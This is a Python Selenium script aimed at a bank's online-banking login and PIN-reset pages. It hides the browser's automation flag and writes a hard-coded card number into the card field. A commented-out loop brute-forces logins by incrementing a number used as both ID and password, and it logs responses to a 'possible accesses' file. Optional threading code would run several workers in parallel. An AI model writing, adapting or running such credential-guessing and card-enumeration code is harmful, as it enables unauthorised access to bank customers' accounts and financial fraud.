from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
from selenium.common.exceptions import NoSuchElementException
from os import system
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import WebDriverException

#from concurrent.futures import ThreadPoolExecutor
from threading import Thread, Barrier
from requests import get
from selenium.webdriver.firefox.options import Options
import telegram
from colorama import init,Fore,Back,Style
#from io import open

def func():
    #global driver
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_experimental_option("excludeSwitches", ['enable-automation'])
    driver = webdriver.Chrome(executable_path=r"C:\WebDriver\chromedriver.exe", options = chrome_options)
    #firefox_options.add_argument("--headless")
    #firefox_options.add_argument("--start-maximized")
    #chrome_options.add_argument("--incognito")
    
    driver.get(url)
    print(driver)
    #time.sleep(15)
    print("buscanmdo")
    input()
    #wait0 = WebDriverWait(driver,10)
    #wait0.until(EC.visibility_of_element_located((By.XPATH,pathNumTarjeta)))
    driver.execute_script(f'document.getElementById("n_tarjeta").value="4580760187838650"')
    #driver.find_element(By.ID, 'n_tarjeta').send_keys(num)
    print("fin")
    input()
    """
    global num
    vacio = "0"
    textClave = ''
    #print(num)
    while (True):
        wait0 = WebDriverWait(driver,10)
        driver.find_element(By.ID,'nuDni').send_keys(num)
        driver.find_element(By.ID,'npass').send_keys(num)
        driver.execute_script(f'document.getElementById("npass").type={vacio};')
        wait0.until(EC.visibility_of_element_located((By.XPATH,pathBotonIngresar)))
        driver.find_element(By.XPATH,pathBotonIngresar).click()
        
        try:
            try:
                wait0.until(EC.visibility_of_element_located((By.XPATH,path_ventanaError)))
                p = driver.find_element(By.XPATH,path_mensajeError).text

                driver.find_element(By.XPATH,pathCerrarbtn).click()
            except Exception as e:
                print(Fore.RED)
                wait0.until(EC.visibility_of_element_located((By.XPATH,path_ventanaError2))) #esperando ventana roja
                p = driver.find_element(By.XPATH,path_mensajeError2).text
                
                driver.find_element(By.XPATH,pathCerrarVentana).click()
                driver.execute_script(f'document.getElementById("nuDni").value = "{textClave}";')
                driver.execute_script(f'document.getElementById("npass").value = "{textClave}";')

                posibles = open("posiblesacces.txt","a")
                posibles.write(str(num), p.strip())
                posibles.write("\n")
                posibles.close()
                time.sleep(1)
        except Exception as e:
            print("Saliendo pipipipi")
            break
        print(Fore.CYAN)
        if "textoModal" in p:
            break
        print(num," | ",p)
        num = num + 1

        """

def funcionUnida():
    func()
    #while(True):
     #   accion()
#-----------------------------------------------

if __name__ == '__main__':
    init()
    idTarjeta = 'n_tarjeta'
    pathNumTarjeta = "/html/body/form/center/div/table/tbody/tr[3]/td/input[3]"



    print(Fore.CYAN)
    url = "https://www.bancomercio.com/personas"
    url2 = "https://enlinea.bancom.pe/hb/resetPin_step1.jsf"
    #numero_multi = 2
    #numero_multi = input("Workesr: ")
    #threads = []

    pe = True
    num = 4580760187838650
    func()

    """
    for _ in range (int(numero_multi)):
        i = Thread(target=funcionUnida)
        threads.append(i)
        i.start()     

    for i in threads:
        i.join()
    """



